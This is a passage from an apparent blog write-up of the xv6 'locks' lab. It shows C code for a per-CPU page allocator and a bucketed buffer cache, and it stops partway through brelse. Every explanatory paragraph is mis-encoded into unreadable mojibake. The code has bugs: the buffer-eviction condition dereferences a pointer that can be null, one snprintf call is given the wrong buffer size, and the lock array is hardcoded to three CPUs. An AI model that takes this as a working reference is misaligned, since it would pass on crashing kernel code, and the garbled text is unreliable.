<h2 id="Lab8-locks"><a href="#Lab8-locks" class="headerlink" title="Lab8: locks"></a>Lab8: locks</h2><h3 id="å®éªŒä¸€"><a href="#å®éªŒä¸€" class="headerlink" title="å®éªŒä¸€"></a>å®éªŒä¸€</h3><p>ä¸ºæ¯ä¸ªcpuå‡†å¤‡ä¸€ä¸ªç©ºé—²é˜Ÿåˆ—ï¼Œç„¶åæ¯ä¸ªcpuåœ¨è‡ªå·±çš„ç©ºé—²é˜Ÿåˆ—ä¸Šè·å¾—æ–°é¡µé¢ï¼Œç„¶åä¸ºæ¯ä¸ªç©ºé—²é˜Ÿåˆ—å‡†å¤‡ä¸€ä¸ªé”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;memlayout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> end[]; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem[<span class="number">0</span>].lock, <span class="string">&quot;kmem0&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">1</span>].lock, <span class="string">&quot;kmem1&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">2</span>].lock, <span class="string">&quot;kmem2&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pa : %p\n&quot;</span>,(uint64)pa);</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line">  keme_id=(((uint64)pa)&gt;&gt;<span class="number">12</span>)%<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r-&gt;next = kmem[keme_id].freelist;</span><br><span class="line">  kmem[keme_id].freelist = r;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">get_other_freeelist_r</span><span class="params">(uint32 kmem_id)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  acquire(&amp;kmem[kmem_id].lock);</span><br><span class="line">  r = kmem[kmem_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[kmem_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[kmem_id].lock);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line">  keme_id=cpuid();</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r = kmem[keme_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[keme_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">    r=get_other_freeelist_r((keme_id+<span class="number">1</span>)%<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">      r=get_other_freeelist_r((keme_id+<span class="number">2</span>)%<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å®éªŒäºŒ"><a href="#å®éªŒäºŒ" class="headerlink" title="å®éªŒäºŒ"></a>å®éªŒäºŒ</h3><p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸­ï¼Œä¼šæœ‰ä¸€ä¸ªç¼“å†²åŒºåˆ—è¡¨æ¥è®°å½•ç£ç›˜å†…å®¹ï¼Œå½“è¯»ç£ç›˜çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šæŠŠå†…å®¹ç¼“å†²åˆ°è¿™ä¸ªç¼“å†²åŒºï¼Œç„¶åå†ä»è¿™ä¸ªç¼“å†²åŒºä¸­è¯»å–ä¿¡æ¯ï¼Œåˆšå¼€å§‹è¿™ä¸ªç¼“å†²åŒºå…¨éƒ¨æ”¾åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ç„¶åä½¿ç”¨ä¸€ä¸ªé”é˜²æ­¢ç«äº‰ï¼Œä½†æ˜¯ioååé‡æ¯”è¾ƒå¤§çš„æ—¶å€™æ˜¯æ¯”è¾ƒæµªè´¹cpuèµ„æºçš„ï¼Œæ‰€ä»¥å¾—è®©æ•°æ®ç»“æ„æ›´åŠ ç»†åŒ–ï¼Œé€‰æ‹©ä½¿ç”¨ä¸€ä¸ªæ¡¶ï¼ˆä½†æ„Ÿè§‰å’Œå“ˆå¸Œè¡¨æ²¡å•¥å·®åˆ«ï¼‰æ¥æ•´å¤šä¸ªé“¾è¡¨ï¼Œç„¶åæ¯ä¸ªé“¾è¡¨ä¸€ä¸ªé”æ¥ä¿æŠ¤ï¼Œè¿™æ ·æ—¢èƒ½é˜²æ­¢ç«äº‰ï¼Œåˆèƒ½æ›´åŠ çº¿ç¨‹åŒ–ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Bucket_size 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HASH(id) (id%13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;sleeplock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;buf.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">bucket</span>&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> <span class="title">buckets</span>[13];</span></span><br><span class="line">  </span><br><span class="line">&#125; bcache;</span><br><span class="line"><span class="keyword">char</span> lockname[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> b_lockname[<span class="number">30</span>][<span class="number">16</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">binit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(lockname));</span><br><span class="line">  <span class="built_in">memset</span>(b_lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(b_lockname));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(lockname[i],<span class="keyword">sizeof</span>(lockname),<span class="string">&quot;bcahce_%d&quot;</span>,i);</span><br><span class="line">    initlock(&amp;(bcache.buckets[i].lock),lockname[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    bcache.buckets[i].head.prev=&amp;bcache.buckets[i].head;</span><br><span class="line">    bcache.buckets[i].head.next=&amp;bcache.buckets[i].head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++)&#123;</span><br><span class="line">    b-&gt;next = bcache.buckets[<span class="number">0</span>].head.next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.buckets[<span class="number">0</span>].head;</span><br><span class="line">    <span class="built_in">snprintf</span>(b_lockname[i],<span class="keyword">sizeof</span>(b_lockname),<span class="string">&quot;buffer_%d&quot;</span>,i);</span><br><span class="line">    initsleeplock(&amp;b-&gt;lock,b_lockname[i]);</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next-&gt;prev = b;</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next = b;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Look through buffer cache for block on device dev.</span></span><br><span class="line"><span class="comment">// If not found, allocate a buffer.</span></span><br><span class="line"><span class="comment">// In either case, return locked buffer.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bget</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">tmp</span>;</span></span><br><span class="line">  uint32 bid;</span><br><span class="line">  bid=HASH(blockno);</span><br><span class="line">  tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// // Is the block already cached?</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.next; b != &amp;bcache.head; b = b-&gt;next)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt++;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">for</span>(b=bcache.buckets[bid].head.next;b!=&amp;bcache.buckets[bid].head;b=b-&gt;next)&#123;</span><br><span class="line">    <span class="keyword">if</span>(dev==b-&gt;dev&amp;&amp;blockno==b-&gt;blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      b-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  b=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=bid,cur=<span class="number">0</span>;cur&lt;Bucket_size;i=(i+<span class="number">1</span>)%Bucket_size)&#123;</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">if</span>(i!=bid)&#123;</span><br><span class="line">      <span class="keyword">if</span>(!holding(&amp;bcache.buckets[i].lock))&#123;</span><br><span class="line">        <span class="comment">// printf(&quot;asd\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">        acquire(&amp;bcache.buckets[i].lock);</span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq_end:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(b=bcache.buckets[i].head.next;b!=&amp;bcache.buckets[i].head;b=b-&gt;next)&#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;refcnt==<span class="number">0</span>&amp;&amp;((b-&gt;timetick&lt;tmp-&gt;timetick)||tmp))&#123;</span><br><span class="line">        tmp=b;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tmp)&#123;</span><br><span class="line">      <span class="comment">// printf(&quot;tmp:%d,bif:%d\n&quot;,i,bid);</span></span><br><span class="line">      tmp-&gt;next-&gt;prev=tmp-&gt;prev;</span><br><span class="line">      tmp-&gt;prev-&gt;next=tmp-&gt;next;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      tmp-&gt;next=bcache.buckets[bid].head.next;</span><br><span class="line">      tmp-&gt;prev=&amp;bcache.buckets[bid].head;</span><br><span class="line">      bcache.buckets[bid].head.next-&gt;prev=tmp;</span><br><span class="line">      bcache.buckets[bid].head.next=tmp;</span><br><span class="line">      tmp-&gt;dev = dev;</span><br><span class="line">      tmp-&gt;blockno = blockno;</span><br><span class="line">      tmp-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      tmp-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      tmp-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep:%s\n&quot;,tmp-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;tmp-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached.</span></span><br><span class="line">  <span class="comment">// Recycle the least recently used (LRU) unused buffer.</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.prev; b != &amp;bcache.head; b = b-&gt;prev)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;refcnt == 0) &#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;dev = dev;</span></span><br><span class="line">  <span class="comment">//     b-&gt;blockno = blockno;</span></span><br><span class="line">  <span class="comment">//     b-&gt;valid = 0;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt = 1;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a locked buf with the contents of the indicated block.</span></span><br><span class="line"><span class="function">struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bread</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;bread-beg\n&quot;);</span></span><br><span class="line">  b = bget(dev, blockno);</span><br><span class="line">  <span class="keyword">if</span>(!b-&gt;valid) &#123;</span><br><span class="line">    virtio_disk_rw(b, <span class="number">0</span>);</span><br><span class="line">    b-&gt;valid = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;bread-end\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write b&#x27;s contents to disk.  Must be locked.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bwrite</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;bwrite&quot;</span>);</span><br><span class="line">  virtio_disk_rw(b, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Release a locked buffer.</span></span><br><span class="line"><span class="comment">// Move to the head of the most-recently-used list.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">brelse</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint32 bid;</span><br><span class="line">  <span class="comment">// printf(&quot;brelse-beg\n&quot;);</span></span><br><span class="line">  bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line">  <span class="comment">// printf(&quot;re_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// printf(&quot;brelse-end\n&quot;);</span></span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  